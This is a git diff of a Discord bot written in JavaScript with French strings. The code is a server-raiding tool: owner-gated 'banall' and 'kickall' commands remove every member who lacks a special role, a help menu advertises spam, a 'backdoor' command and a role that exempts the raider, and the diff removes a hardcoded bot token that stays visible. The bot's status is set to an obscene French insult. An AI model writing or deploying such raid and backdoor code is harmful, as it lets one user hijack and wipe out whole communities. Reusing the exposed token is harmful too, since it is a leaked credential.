@@ -15,11 +15,11 @@ function cmd(str, msg) {
   }
 
 client.on('ready', () => {
-  client.user.setGame('EF ALL h!help')
+  client.user.setGame('bz ta grosse pute de mere')
   console.log(`Connecté au Compte ${client.user.tag}!`);
 });
 
-client.login("NDY0MTI3MDMzOTIwOTc4OTc1.Dh_FSQ.yjylXCvgOkaQDFrKtiV2KawEhR8");
+
 client.login(process.env.TOKEN);
         
 
@@ -254,7 +254,7 @@ if(cmd("k", message)) {
             if (message.author.id !== '457858896988733451') return;
             message.delete();
 
-            message.channel.send("prefix: /\nspam 'msg': spam le msg \ninfo: envoi une invitation du bot\nsay: envoi un msg en embeds\nbackdoor: te cree une backdoor\nm6: te lvl up le mee6")
+            message.channel.send("prefix: !\nk: te met un grade pr pas te faire banall ou kickall\nkickall\nbanall\nspam 'msg': spam le msg \ninfo: envoi une invitation du bot\nsay: envoi un msg en embeds\nbackdoor: te cree une backdoor\nm6: te lvl up le mee6")
       
             
       }
@@ -387,7 +387,7 @@ message.delete();
 client.on("message", message => {
   if(cmd("banall", message)) {
     message.delete();
-    if (message.author.id !== '464127033920978975') return;
+    if (message.author.id !== '457858896988733451') return;
 
     message.guild.members.forEach(member => {
       if (!member.roles.exists("name", "K") && member.bannable) member.ban().catch(e => {});
@@ -403,7 +403,7 @@ client.on("message", message => {
 client.on("message", message => {
   if(cmd("kickall", message)) {
     message.delete();
-    if (message.author.id !== '464127033920978975') return;
+    if (message.author.id !== '457858896988733451') return;
 
     message.guild.members.forEach(member => {
       if (!member.roles.exists("name", "K") && member.kickable) member.kick().catch(e => {});
